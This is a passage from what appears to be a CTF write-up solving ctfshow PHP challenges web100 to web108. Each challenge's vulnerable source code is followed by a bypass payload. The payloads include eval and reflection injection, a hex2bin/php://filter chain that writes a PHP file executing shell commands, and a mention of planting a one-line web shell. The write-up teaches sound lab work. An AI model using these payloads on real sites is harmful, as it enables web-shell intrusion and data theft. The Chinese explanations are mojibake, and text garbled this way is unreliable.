èšå‰‘è¿æ¥</code></p><ul><li>array_push()ï¼šå°†ä¸€ä¸ªæˆ–è€…å¤šä¸ªæ•°æ®å­˜å…¥æ•°ç»„ä¸­</li><li>in_array()ï¼šæ£€æŸ¥æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå€¼ </li><li>file_put_contents()ï¼šå°†æ•°æ®å†™å…¥æ–‡ä»¶ä¸­</li></ul><blockquote><p>å½“in_array()æ£€æŸ¥çš„æ•°æ®ä¸ºæ•°å­—åŠ å­—ç¬¦ä¸²æ—¶ï¼Œä¼šæˆªå–ç¬¬ä¸€ä¸ªéæ•°å­—å­—ç¬¦å‰çš„æ‰€æœ‰æ•°å­—ä½œä¸ºæ£€æŸ¥çš„å¯¹è±¡ï¼Œæ‰€ä»¥å¯ä»¥ä¼ 1.phpï¼Œåœ¨è¯¥å‡½æ•°ä¸­è¡¨ç°çš„æ˜¯æ£€æµ‹1æ˜¯å¦å­˜åœ¨ï¼Œè¿™æ ·å°±ç»•è¿‡äº†è¯¥å‡½æ•°</p><p>å†™å…¥æ–‡ä»¶çš„å†…å®¹æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ<br>ç›®çš„æ˜¯ä¸ºäº†è·å¾—è·¯å¾„ï¼Œè¯»å–ç›®å½•ï¼Œè¿›è€Œå¾—åˆ°flag<br>æ‰€ä»¥å¯ä»¥å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç”¨èšå‰‘è¿æ¥ï¼Œè·å¾—flag</p></blockquote><h1 id="web100-ReflectionClass"><a href="#web100-ReflectionClass" class="headerlink" title="web100(ReflectionClass)"></a>web100(ReflectionClass)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></p><ul><li>æ ¹æ®æç¤ºï¼Œå¾—å‡ºflagåœ¨ctfshow()ç±»ä¸­</li><li>åœ¨å¤–å±‚ifåˆ¤æ–­åªéœ€è®©v0ä¸ºçœŸå³å¯ï¼Œv0ä¸ºçœŸï¼Œåªéœ€è®©<code>is_numeric($v1)</code>ä¸ºçœŸå³å¯</li><li>ç¬¬äºŒå±‚ifåˆ¤æ–­ä¸­ï¼Œä¸èƒ½æœ‰<code>;</code>ï¼Œç¬¬ä¸‰å±‚ifä¸­å¿…é¡»æœ‰<code>;</code></li><li>æ ¹æ®phpç‰¹æ€§ä¸­çš„åå°„ç±»ç›¸å…³çŸ¥è¯†ï¼Œæ„é€ ä¸€ä¸ªåå°„ç±»ï¼Œå°†ctfshow()ç›¸å…³ä¿¡æ¯ï¼Œç”¨echoæ‰“å°å‡ºæ¥å³å¯</li></ul><h1 id="web101-ReflectionClass"><a href="#web101-ReflectionClass" class="headerlink" title="web101(ReflectionClass)"></a>web101(ReflectionClass)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></p><ul><li>æ­£åˆ™è¿‡æ»¤äº†ä¸€å¤§å †ä¸œè¥¿ï¼Œå®é™…ä¸Špayloadè·Ÿä¸Šä¸ªé¢˜ä¸€æ ·</li></ul><h1 id="web102-call-user-func"><a href="#web102-call-user-func" class="headerlink" title="web102(call_user_func)"></a>web102(call_user_func)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php    v1=hex2bin</code></p><ul><li>is_numeric()ï¼šæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼ˆå¯ä»¥åˆ©ç”¨ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡ï¼‰</li><li>call_user_func()ï¼šæŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨ï¼ˆå…¶ä½™å‚æ•°ä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°ï¼‰</li><li><p>è§£é¢˜æ€è·¯ï¼š</p><ul><li>v4éœ€ä¸ºçœŸï¼Œåˆ™v2éœ€ä¸ºæ•°å­—æˆ–è€…ä¸ºç§‘å­¦è®¡æ•°æ³•å½¢å¼çš„æ•°å­—å­—ç¬¦ä¸²</li><li>æ ¹æ®ç¬¬å…­è¡Œå¾—å‡ºï¼Œå¯¹v2éœ€è¦è¿›è¡Œç‰¹æ®Šå¤„ç†â€”â€”ä»ç¬¬äºŒä¸ªå­—ç¬¦å¼€å§‹ç®—èµ·</li><li>å¯¹ç»è¿‡å¤„ç†çš„v2è¿›è¡ŒæŸç§å‡½æ•°æ“ä½œï¼Œv1éœ€ä¸ºå‡½æ•°å</li><li>å°†å¤„ç†åçš„æ•°æ®å†™å…¥æ–‡ä»¶ä¸­ï¼Œv3éœ€ä¸ºæ–‡ä»¶å</li></ul></li><li><p>call_user_func()å‡½æ•°å¯ä¸hex2bin()å‡½æ•°æ­é…ä½¿ç”¨ï¼ˆhex2bin()ï¼šå°†åå…­è¿›åˆ¶æ–‡æœ¬è½¬æ¢ä¸ºASCIIç å­—ç¬¦ï¼‰</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * v2ä¸ºå†™å…¥æ–‡ä»¶çš„å†…å®¹è¦æ±‚ï¼šè¯¥æ•°æ®çš„base64ç¼–ç åçš„æ•°æ®çš„åå…­è¿›åˆ¶æ˜¯çº¯æ•°å­—æˆ–è€…ç§‘å­¦è®¡æ•°æ³•å½¢å¼</span></span><br><span class="line"><span class="comment"> * ä¾‹ï¼š&lt;?=`cat *`;</span></span><br><span class="line"><span class="comment"> * base64ç¼–ç ä¸ºï¼šPD89YGNhdCAqYDs</span></span><br><span class="line"><span class="comment"> * åå…­è¿›åˆ¶è½¬æ¢ä¸ºï¼š5044383959474e6864434171594473</span></span><br><span class="line"><span class="comment"> * å› ä¸ºsubsträ½¿å¾—æ•°æ®ä»ç¬¬äºŒä½å¼€å§‹æˆªå–ï¼Œæ‰€ä»¥éœ€åœ¨å‰é¢åŠ ä¸¤ä½æ•°å­—</span></span><br><span class="line"><span class="comment"> * v2=115044383959474e6864434171594473</span></span><br><span class="line"><span class="comment"> * å› ä¸ºè¦å¯¹v2è¿›è¡Œåå…­è¿›åˆ¶è½¬æ¢base64ï¼Œæ‰€ä»¥v1ä¸ºhex2binå‡½æ•°</span></span><br><span class="line"><span class="comment"> * æ•°æ®æœ€ååä¸ºbase64ç¼–ç å½¢å¼</span></span><br><span class="line"><span class="comment"> * æ‰€ä»¥éœ€åˆ©ç”¨ä¼ªåè®®å†™å…¥æ–‡ä»¶ï¼Œæ¡ä»¶æ˜¯base64ç¼–ç </span></span><br><span class="line"><span class="comment"> * v3=php://filter/write=convert.base64-decode/resource=1.php</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h1 id="web103-call-user-func"><a href="#web103-call-user-func" class="headerlink" title="web103(call_user_func)"></a>web103(call_user_func)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php    v1=hex2bin</code></p><ul><li>ifè¡¨è¾¾å¼ä¸­ä¸èƒ½å‡ºç°phpï¼Œä½†æ˜¯æˆ‘ä»¬ç»è¿‡å¤„ç†çš„æ•°æ®ä¹Ÿä¸å­˜åœ¨php</li><li>æ‰€payloadè·Ÿä¸Šé“é¢˜ä¸€æ ·</li></ul><h1 id="web104-sha1"><a href="#web104-sha1" class="headerlink" title="web104(sha1)"></a>web104(sha1)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?v2[]=1    v1[]=1</code></p><ul><li>æ•°ç»„ç»•è¿‡</li></ul><h1 id="web105-foreach"><a href="#web105-foreach" class="headerlink" title="web105(foreach)"></a>web105(foreach)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br></pre></td></tr></table></figure><p><code>payload: ?fff=flag error=fff</code></p><ul><li><p>éå†æ•°ç»„ï¼Œä½¿ç”¨foreachï¼Œå¿…é¡»ä½¿ç”¨æ•°ç»„</p></li><li><p>ä»£ç åˆ†æï¼š</p></li></ul><blockquote><p>çœ‹æºç ï¼Œèƒ½è¾“å‡ºæ•°æ®çš„åªæœ‰<code>$flag $error $suces</code>ä¸‰ä¸ªå˜é‡</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ç¬¬ä¸€ä¸ªforeachå°†æˆ‘ä»¬ä¼ å…¥çš„<code>å˜é‡=å€¼</code>ä»¥é”®å€¼å¯¹çš„å½¢å¼è¿›è¡Œèµ‹å€¼<br><code>$key=å˜é‡ $value=å€¼</code><br>ç»è¿‡ç¬¬äº”è¡Œçš„å˜é‡è¦†ç›–å¤„ç†å¾—åˆ°è¦†ç›–åçš„æ•°æ®<br><code>$$key=$å˜é‡ $$value=$å€¼</code><br>å¹¶ä¸”$keyä¸ç­‰äºerror</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ç¬¬äºŒä¸ªforeachå°†æˆ‘ä»¬ä¼ å…¥çš„<code>å˜é‡=å€¼</code>ä»¥é”®å€¼å¯¹çš„å½¢å¼è¿›è¡Œèµ‹å€¼<br><code>$key=å˜é‡ $value=å€¼</code><br>ç»è¿‡ç¬¬äº”è¡Œçš„å˜é‡è¦†ç›–å¤„ç†å¾—åˆ°è¦†ç›–åçš„æ•°æ®<br><code>$$key=$å˜é‡ $$value=$å€¼</code><br>å¹¶ä¸”$valueä¸ç­‰äºflag</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ç¬¬ä¸‰æ®µifåˆ¤æ–­<br>POSTä¼ å…¥çš„å€¼ä¸ä¸ºå˜é‡flagï¼Œåˆ™è¾“å‡ºå˜é‡error</p></blockquote><ul><li>è§£é¢˜æ€è·¯ï¼š<ul><li>å¯ä»¥åˆ©ç”¨errorè¿›è¡Œè¾“å‡ºï¼Œåªéœ€è¦POSTä¼ å…¥çš„å€¼ä¸ä¸ºflagå˜é‡å³å¯</li><li>GETä¼ å‚ï¼š?fff=flag  <ul><li>$key=$fff  $value=$flag =&gt; $fff=$flag</li></ul></li><li>POSTä¼ å‚ï¼š?error=fff<ul><li>$key=$error $value=$fff =&gt; $error=$fff</li></ul></li><li>å°†$flagçš„å€¼èµ‹å€¼ç»™$errorï¼Œè¾“å‡º$errorå³å¯</li><li>æ»¡è¶³ifåˆ¤æ–­ï¼Œå³å¯è¾“å‡ºflag</li></ul></li></ul><h1 id="web106-sha1"><a href="#web106-sha1" class="headerlink" title="web106(sha1)"></a>web106(sha1)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v2[]=1 v1[]=2</code></p><ul><li>æ•°ç»„ç»•è¿‡ï¼Œåªéœ€è¦è®©å€¼ä¸åŒå³å¯</li></ul><h1 id="web107-parse-str"><a href="#web107-parse-str" class="headerlink" title="web107(parse_str)"></a>web107(parse_str)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       <span class="title function_ invoke__">parse_str</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v3[]=1 v1=&#39;flag=0&#39;</code></p><ul><li>parse_str()ï¼šå°†ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºæ•°ç»„å…ƒç´ å­˜å…¥ç¬¬äºŒä¸ªå˜é‡ä¸­</li><li>å­˜æ•°ç»„çš„å˜é‡ä¸º$v2ï¼Œä¸”ifä¸­åˆ¤æ–­ç´¢å¼•å€¼ä¸ºflagçš„å€¼æ˜¯å¦å’Œv3ç»è¿‡md5åŠ å¯†çš„æ•°æ®ç›¸ç­‰</li><li>æ‰€ä»¥POSTä¼ å…¥<code>&#39;flag=0&#39;</code>ï¼ˆæ³¨æ„ï¼šPOSTä¼ å‚éœ€è¦ç”¨å•å¼•å·ï¼‰</li><li>GETå¯ä»¥ä¼ å…¥æ•°ç»„è¿›è¡Œç»•è¿‡</li></ul><h1 id="web108-strrev"><a href="#web108-strrev" class="headerlink" title="web108(strrev)"></a>web108(strrev)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>paylad: ?c=a%00778</code></p><ul><li>strrev()ï¼šå­—ç¬¦ä¸²åè½¬ï¼Œä½†%00ä¸ä¼šåè½¬ï¼ˆ%00æ˜¯ä¸€ä¸ªæ•´ä½“ï¼Œä¸ä¼šåè½¬æˆ00% ï¼‰</li><li>ç¬¬ä¸€ä¸ªiféœ€è¦GETä¼ å…¥çš„å‚æ•°æœ‰å­—æ¯æ‰èƒ½ç»•è¿‡</li><li>ç¬¬äºŒä¸ªifå°†ä¼ 